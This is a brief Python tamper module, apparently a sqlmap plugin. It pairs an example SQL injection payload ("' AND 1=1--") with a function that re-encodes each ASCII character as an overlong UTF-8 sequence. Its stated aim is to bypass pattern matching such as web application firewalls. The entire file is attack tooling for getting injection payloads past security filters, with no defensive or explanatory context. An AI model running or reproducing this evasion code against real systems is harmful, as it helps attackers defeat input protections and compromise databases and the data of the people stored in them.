__example_payload__ = "' AND 1=1--"
__type__ = "overlong UTF-8 encoding to bypass pattern matching"


def tamper(payload, **kwargs):
    if payload:
        retval = ""
        for char in payload:
            if ord(char) < 128 and char not in (' ', '\t', '\n', '\r'):
                retval += chr(0xC0 | (ord(char) >> 6))
                retval += chr(0x80 | (ord(char) & 0x3F))
            else:
                retval += char
        return retval
    return payload
